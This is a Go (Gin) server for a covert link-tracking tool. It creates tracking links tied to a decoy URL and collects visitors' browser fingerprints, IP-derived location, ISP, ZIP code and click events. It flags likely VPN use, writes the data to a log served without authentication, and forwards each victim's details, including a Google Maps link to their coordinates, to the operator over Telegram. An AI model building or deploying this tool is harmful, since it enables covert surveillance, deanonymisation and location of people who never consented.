// BACKEND (Go + Gin + Telegram)
// Tracks visitors' IP, User-Agent & location, logs them, and sends Telegram notification with Google Maps link and VPN detection

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

type LinkData struct {
	DecoyURL string `json:"decoyUrl"`
}

type TrackData struct {
	ID          string                   `json:"id"`
	Fingerprint map[string]interface{}   `json:"fingerprint"`
	Geo         map[string]interface{}   `json:"geo"`
	Events      []map[string]interface{} `json:"events"`
	Duration    int64                    `json:"duration"`
}

type LinkInfo struct {
	DecoyURL string
}

var linkStore = make(map[string]LinkInfo)

var telegramBotToken = os.Getenv("TELEGRAM_BOT_TOKEN")
var telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")
var linkPrefix = os.Getenv("LINK_PREFIX")

func generateID() string {
	rand.Seed(time.Now().UnixNano())
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, 8)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func sendTelegramMessage(message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	payload := map[string]string{
		"chat_id":    telegramChatID,
		"text":       message,
		"parse_mode": "Markdown",
	}
	jsonPayload, _ := json.Marshal(payload)
	_, _ = http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
}

func generateLink(c *gin.Context) {
	var data LinkData
	if err := c.BindJSON(&data); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	id := generateID()
	linkStore[id] = LinkInfo{DecoyURL: data.DecoyURL}
	c.JSON(http.StatusOK, gin.H{"link": fmt.Sprintf("%s/track/%s", linkPrefix, id)})
}

func trackDeepData(c *gin.Context) {
	var data TrackData
	if err := c.BindJSON(&data); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid tracking data"})
		return
	}

	geoJSON, _ := json.Marshal(data.Geo)
	geoStr := string(geoJSON)
	vpnSuspect := strings.Contains(geoStr, "Cloud") || strings.Contains(geoStr, "Relay") || strings.Contains(geoStr, "Apple") || strings.Contains(geoStr, "Hosting")
	vpnLabel := ""
	if vpnSuspect {
		vpnLabel = "\n⚡ *Possible VPN/Relay Detected!*"
	}

	entry := fmt.Sprintf("\n\n✅ Deep Tracking\nID: %s\nDuration: %dms\nFingerprint: %+v\nGeo: %+v\nEvents: %d\n-----------\n",
		data.ID, data.Duration, data.Fingerprint, data.Geo, len(data.Events))

	f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	f.WriteString(entry)

	geoSummary := fmt.Sprintf("\nLocation: %s, %s (%s)\nISP: %s\nRegion: %s\nOrg: %s\nZIP: %s\nCoords: https://www.google.com/maps?q=%v,%v",
		data.Geo["city"], data.Geo["country"], data.Geo["countryCode"],
		data.Geo["isp"], data.Geo["regionName"], data.Geo["org"], data.Geo["zip"],
		data.Geo["lat"], data.Geo["lon"])

	fp := data.Fingerprint
	fpDetails := fmt.Sprintf("\n\n🧠 *Fingerprint Info:*\nUser-Agent: `%s`\nPlatform: `%s`\nLang: `%s`\nScreen: `%s`\nTouch: `%v`\nDNT: `%v`\nTimezone: `%s`",
		fp["userAgent"], fp["platform"], fp["language"], fp["screen"], fp["touchSupport"], fp["dnt"], fp["timezone"])

	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s%s%s",
		data.ID,
		data.Duration,
		len(data.Events),
		vpnLabel,
		geoSummary,
		fpDetails)

	sendTelegramMessage(summary)
	c.JSON(http.StatusOK, gin.H{"status": "tracked"})
}

func viewLogs(c *gin.Context) {
	logData, err := ioutil.ReadFile("log.txt")
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read log file"})
		return
	}
	c.Data(http.StatusOK, "text/plain; charset=utf-8", logData)
}

func redirectHandler(c *gin.Context) {
	id := c.Param("id")
	_, exists := linkStore[id]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Link not found"})
		return
	}

	c.Redirect(http.StatusTemporaryRedirect, fmt.Sprintf("%s/track/%s", linkPrefix, id))
}

func main() {
	r := gin.Default()

	r.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	})

	r.POST("/api/generate", generateLink)
	r.POST("/api/track", trackDeepData)
	r.GET("/api/logs", viewLogs)
	r.GET("/t/:id", redirectHandler)

	fmt.Println("Server started at http://0.0.0.0:8080")
	r.Run("0.0.0.0:8080")
}
